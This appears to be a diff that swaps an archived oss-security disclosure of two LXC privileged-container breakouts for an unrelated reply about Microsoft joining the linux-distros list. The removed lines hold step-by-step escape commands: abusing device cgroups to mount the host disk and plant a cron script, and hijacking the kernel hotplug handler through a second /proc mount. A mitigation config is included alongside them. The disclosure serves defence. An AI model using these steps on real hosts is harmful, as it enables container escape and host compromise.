@@ -1,141 +1,87 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/02/12/6
-Message-ID: <CAN_LGv21xFRzej=akWo0rn2PRMydbu-+33h6uqLJ6BkzP-kf3Q@mail.gmail.com>
-Date: Tue, 12 Feb 2019 23:34:43 +0500
-From: "Alexander E. Patrakov" <patrakov@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/08/12/1
+Message-ID: <20190812024751.GA17747@sasha-vm>
+Date: Sun, 11 Aug 2019 22:47:51 -0400
+From: Sasha Levin <sashal@...nel.org>
 To: oss-security@...ts.openwall.com
-Cc: lxc-users@...ts.linuxcontainers.org
-Subject: Two more LXC breakouts (both privileged), apparmor issue?
+Subject: Re: linux-distros membership application - Microsoft
 Content-Type: text/plain; charset=utf-8
 
-Hello,
+On Thu, Jun 27, 2019 at 04:03:21PM +0200, Solar Designer wrote:
+>On Wed, Jun 26, 2019 at 10:13:58AM -0400, Sasha Levin wrote:
+>> We understand this need and will be contributing back. Looking at the
+>> list of vacant positions I can suggest the following, but I suspect that
+>> existing list members will have better suggestions.
+>>
+>> Technical:
+>>
+>> 3. Review and/or test the proposed patches and point out potential
+>> issues with them (such as incomplete fixes for the originally reported
+>> issues, additional issues you might notice, and newly introduced bugs),
+>> and inform the list of the work done even if no issues were encountered
+>> - primary: Amazon, backup: vacant
+>>
+>> Administrative:
+>>
+>> 3. Evaluate if the issue (or one of the issues) is effectively already
+>> public (e.g., a fix is committed upstream with a descriptive message)
+>> or/and is low severity and thus the report (or its portion pertaining to
+>> the issue) should be made public right away for one or both of these
+>> reasons, get a few other list members to confirm this understanding, and
+>> if there are no objections then communicate this strong preference to
+>> the reporter - primary: CloudLinux, backup: vacant
+>
+>If Microsoft volunteers for these, I'd like that to be in "primary" role
+>at least for the technical task of "3. Review and/or test the proposed
+>patches ..."  I think Amazon hasn't been doing enough on that front,
+>especially given the request to "inform the list of the work done even
+>if no issues were encountered".  Given this request, if this were
+>seriously worked on, I would have expected such reports from Amazon on
+>almost every issue handled on linux-distros, but this wasn't the case.
+>
+>I also would like a distro (maybe Microsoft) to volunteer for Technical:
+>
+>4. Check if related issues exist in the same piece of software (e.g.,
+>same bug class common across the software, or other kinds of bugs exist
+>in its problematic component), and inform the list either way
+>
+>and Administrative:
+>
+>4. Evaluate relevance to other parties such as the upstream, other
+>affected distros (not present on the (sub-)list), and other Open Source
+>projects, see if the report mentions notifying any of these, communicate
+>your findings and possible concerns to the reporter and the list, and
+>stay on top of the resulting discussion until a decision is made on who
+>else to possibly notify (or not) and any such notifications are in fact
+>made (with the reporter's approval)
+>
+>These are completely unclaimed now, but are much needed.
+>
+>For Technical "4. Check if related issues exist ...", we sometimes get
+>some helpful for varying distros' package maintainers and such, but this
+>is not consistent.  For example, recently Takashi Iwai of SUSE helped
+>with Linux Marvell Wi-Fi driver issues - thanks! - but this is more of
+>an exception than the rule.
+>
+>The lack of a volunteer distro for Administrative "4. Evaluate relevance
+>to other parties ..." came up e.g. here:
+>
+>"Linux kernel: Bluetooth: two remote infoleaks (CVE-2019-3459, CVE-2019-3460)"
+>https://www.openwall.com/lists/oss-security/2019/01/11/2
 
-there is a container breakout currently discussed (CVE-2019-5736),
-which affected LXC among others. Let me share two more, IMHO easier,
-breakout techniques that work against LXC, at least in Ubuntu 18.10,
-which has LXC 3.0.3. Both techniques work only in privileged
-containers, and so, given that LXC upstream does not treat privileged
-containers as a viable security boundary, I don't think there is
-anything CVE-worthy here, just an opportunity to tighten the defaults,
-unless this is a bug in AppArmor or its policies. Also, please treat
-this whole email as Ubuntu-specific, because of the references to
-AppArmor.
+Since Ubuntu took over quite a few tasks (thanks!), I can suggest the
+following tasks for Microsoft:
 
-The primary goal of this email is to post exploits, so that I can
-point people to something better than just nonconstructive words about
-"security implications" when they ask :)
+As primary, administrative: "4. Evaluate relevance to other parties such
+as the upstream, other affected distros (not present on the (sub-)list),
+and other Open Source projects, ...".
 
-The secondary goal is to learn a bit more about AppArmor, i.e. I was
-surprised that the "mount" step works in the first exploit, want to
-know why. I.e. what's the real difference between
-"lxc-container-default" and "lxc-container-default-with-mounting"
-profiles.
+As backup, administrative: "3. Evaluate if the issue (or one of the
+issues) is effectively already public ...".
 
-When reproducing exploits, it is important that you install openssh in
-the test containers, and work from an ssh connection, not lxc-attach.
-That's because of slightly-different namespace setups, and because
-lxc-attach requires root, so "you already have to be root to break
-out", i.e. the achievement becomes too trivial.
+I can also offer to act as a liason between linux-distros and
+security@k.o now, and MSRC in the future.
 
-Prior art:
-
-- myself trying to debug why the memory limit does not apply:
-https://github.com/lxc/lxc/issues/2845
-- an existing bug about unintended access to block devices:
-https://github.com/lxc/lxc/issues/2762
-
-Exploit 1: abuse of device cgroups and block devices
-
-Prerequisite: a privileged container created with the "download"
-template, without tweaking any AppArmor settings. E.g.:
-
-sudo lxc-create -t download -n exploit1 -- -d ubuntu -r cosmic -a amd64
-
-Install openssh there, then let a hacker ssh into it and let them sudo
-to root. So now the hacker has root in a privileged container.
-
-By default, the container is covered by the
-"lxc-container-default-cgns" profile. Or at least, that's what
-mentioned in dmesg in denial messages. It specifically allows mounting
-of cgroup and cgroup2 filesystems under /sys/fs/cgroup. And, by
-default, LXC relies on systemd inside the container to mount cgroup
-hierarchies that it needs. There are also other profiles that can be
-used but are not the default:
-
-- lxc-container-default: does not allow mounting cgroup and cgroup2
-- lxc-container-default-with-mounting: does not allow mounting cgroup
-and cgroup2, but supposedly allows ext2/3/4, xfs, and btrfs.
-- lxc-container-default-with-nesting: allows cgroup and cgroup2, also
-allows almost arbitrary bind mounts.
-
-So, to break out, let's exploit the fact that, on Ubuntu, cgroups are
-the only protection against mounting arbitrary block devices in
-containers - but, by default, there is nothing that prevents the
-hacker from lifting the restriction from within a container. So:
-
-# Step 1: find all device cgroups, add permission to use all block devices.
-f=`find /sys/fs/cgroup -name devices.allow`
-for d in $f ; do echo -n 'b *:* rwm' > "$d" ; done # you may need to
-repeat this a few times
-for d in $f ; do echo -n 'b *:* rwm' > "$d" ; done # ok, repeating
-
-# Step 2: find an interesting block device, create a device node and mount it.
-cat /proc/partitions # found /dev/vda1, looks like the host's root fs is there
-mknod /dev/vda1 b 252 1 # based on numbers from /proc/partitions
-mount /dev/vda1 /mnt # I don't know why this succeeds (on ext4), but it does
-
-# Step 3: write some code that will run on the host
-nano /mnt/etc/cron.d/badscript
-
-# Step 4: wait for cron to run it on the host
-
-I was able to mitigate this by not letting the container access any
-cgroups except the bare minimum necessary for systemd to function. Not
-sure if this creates other security problems.
-
-lxc.apparmor.profile = lxc-container-default
-lxc.mount.entry = tmpfs sys/fs/cgroup tmpfs nosuid,nodev,noexec,mode=755
-lxc.mount.entry = cgroup sys/fs/cgroup/systemd cgroup
-nosuid,nodev,noexec,xattr,name=systemd,create=dir
-
-Question: why is this not the default?
-
-Exploit 2: abuse of hotplug handler
-
-Prerequisite: setup for nested privileged containers. E.g. this:
-
-sudo lxc-create -t download -n exploit2 -- -d ubuntu -r cosmic -a amd64
-
-... with this line uncommented in the config:
-
-lxc.include = /usr/share/lxc/config/nesting.conf
-
-(the config does warn about "security implications", but this is not
-enough to convince people, "known root hole" would be a better
-wording).
-
-To break out, let's exploit the fact that the kernel, when told so via
-/proc, will run arbitary programs for us. I mean, in reaction to
-hotplug events - the legacy handler is settable via
-/proc/sys/kernel/hotplug. There are some rules in the apparmor profile
-that prohibit writing there, but apparmor is path-based, and these
-rules would not fire if a copy of /proc is mounted somewhere else
-(which is needed for nesting but is disallowed otherwise). So:
-
-# Step 1: write a script that will run on the host.
-nano /badscript
-chmod +x /badscript
-
-# Step 2: make it a hotplug event handler via a second instance of /proc
-mkdir /proc2
-mount --bind /proc /proc2
-echo /var/lib/lxc/exploit2/rootfs/badscript > /proc2/sys/kernel/hotplug
-# Well, there was some guessing here based on the default container
-path, I hope it's OK
-
-# Step 3: provoke some hotplug event. Actually, several events.
-ip link add dummy0 type dummy
-
-
--- 
-Alexander E. Patrakov
+--
+Thanks,
+Sasha
